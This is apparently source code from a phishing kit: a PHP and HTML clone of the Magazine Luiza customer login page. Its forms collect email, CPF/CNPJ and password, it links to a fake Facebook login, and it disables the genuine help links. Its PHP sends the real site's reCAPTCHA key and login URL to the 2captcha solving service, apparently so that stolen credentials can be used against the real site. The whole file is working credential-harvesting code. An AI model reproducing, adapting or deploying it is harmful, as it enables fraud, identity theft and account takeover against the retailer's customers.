...
include ('function/filtro.php');


if (isset($_SESSION ['id_produto'])) {

$dadosQA = "SELECT* FROM api_login where id=1";
$conQA = $mysqli->query($dadosQA) or die($mysqli->error);

while ($consultaQA = $conQA->fetch_array()) {
	
	$api_key = $consultaQA ['key_api'];
	$status_api = $consultaQA ['status_api'];

}

if ($status_api == 1 & (!isset($_POST ['singup']))) {


$googlekey = '6LduICwUAAAAAKAKuy-fjzvHxJFX9hs6MQHkuJGR';
$page_url = 'https://sacola.magazineluiza.com.br/#/cliente/login/?origin=magazineluiza&next=https://meuespaco.magazineluiza.com.br/pedidos/';


$urlx = "https://2captcha.com/in.php?key=$api_key&method=userrecaptcha&googlekey=$googlekey&amp&pageurl=$page_url";
...
$storex = file_get_contents($urlx, false, $contextx);
	...
	$explode_1 = explode('|',$storex);
	$captcha_status1 =  strtolower ($explode_1[0]);
	$captcha_id =  strtolower ($explode_1[1]);

	
	$_SESSION ['status_captcha'] = $captcha_status1;
	$_SESSION ['id_captcha'] = $captcha_id;
...
if (isset($_POST ['singup'])) {
	...
	$email_cliente = filtro ($_POST ['login_email']);
...
var i = setInterval(function () {
    ...
    document.getElementById("conteudo").style.display = "inline";
            ...
            <div class="App clearfix">
               <div class="LoginPage">
                  <div class="LoginPage-title">Identificação</div>
                  <div class="LoginPage-mainContainer">
                     <div class="SocialLoginBox">
                        ...
                        <a href="face/login.php"> <button class="SocialLogin-Facebook" aria-label="Fazer login com Facebook">
                           <span>
                     ...
                     <div class="LoginPage-leftContainer">
                        <div class="SignupBox">
                           <div class="LoginBox-title">Quero criar uma conta</div>
						   
                           <form action="login.php" class="LoginBox-form" method="post">
                              <div class="FormGroup">
                                 <div class="FormGroup-inputGroup FormGroup-inputGroup--long">
                                    <input required type="email" id="input-login-61af956a" class="FormGroup-input" placeholder="E-mail" name="login_email" value=""><!-- react-empty: 59 -->
                                 </div>
                                 <div class="FormGroup-feedback">
                                    <!-- react-empty: 62 -->
                                 </div>
                              </div>
                              <button name="singup" type="submit" class="LoginBox-form-continue"><span class="mobile-only">Criar minha conta</span></button>
                           </form>
						   
						   
                           <div class="LoginBox-help mobile-hidden">
                              <!-- react-text: 67 -->Dúvidas?<!-- /react-text --><!-- react-text: 68 --> <!-- /react-text --><a onclick="return false" href="http://www.magazineluiza.com.br/central-de-atendimento/" target="_blank" rel="noopener" data-ga="{&quot;category&quot;: &quot;Login&quot;, &quot;action&quot;: &quot;Fale conosco&quot;, &quot;label&quot;: &quot;&quot;}">fale conosco</a>
                           </div>
                        </div>
                     </div>
                     <div class="LoginPage-rightContainer">
                        <div>
                           <!-- react-empty: 72 --><!-- react-empty: 73 -->
                           <div class="LoginBox">
                              <div class="LoginBox-title">Já sou cliente</div>
                            
                                 <div class="FormGroup">
                                    <div class="FormGroup-inputGroup FormGroup-inputGroup--long">
                                       <input id="user" class="FormGroup-input" placeholder="E-mail, CPF ou CNPJ" name="login" value=""><!-- react-empty: 80 -->
                                    </div>
									
									<p class="FormGroup-errorMessage" id="error_user"></p>
                         
                                 </div>
                                 <div class="FormGroup">
                                    <div class="FormGroup-inputGroup FormGroup-inputGroup--long">
                                       <input id="pass" type="password"  class="FormGroup-input" placeholder="Senha" name="password" value="">
                                    </div>
                                    <div hidden="" class="FormGroup-children">
                                       <button class="ButtonShowPassword" type="button" aria-label="Ver senha">
								  ...
								  <p class="FormGroup-errorMessage" id="error_pass"></p>
                                 </div>
								 
                               <button onClick="acess_login()" class="LoginBox-form-continue">Continuar</button>
							   
                              
                              <div class="LoginBox-help"><a onclick="return false" href="https://sacolamobile.magazineluiza.com.br/#" data-ga="{&quot;category&quot;: &quot;Login&quot;, &quot;action&quot;: &quot;Esqueci minha senha&quot;, &quot;label&quot;: &quot;Selecionou&quot;}">Esqueci minha senha</a></div>
                           </div>
                  ...
                  <div class="LoginPage-socialContainer">
                     <div class="GenericFooter">
                        <p>
                           <!-- react-text: 104 -->Seus dados pessoais serão respeitados de acordo com a nossa <!-- /react-text --><a onclick="return false" href="https://especiais.magazineluiza.com.br/politica-de-privacidade/" target="_blank" rel="noopener">política de privacidade</a><!-- react-text: 106 -->. *Nada será publicado em sua timeline. Serviço válido somente para pessoas físicas.<!-- /react-text --><br><!-- react-text: 108 -->Em caso de dúvidas, acesse nossa central de atendimento.<!-- /react-text -->
                        </p>
                     </div>
                  </div>
               </div>
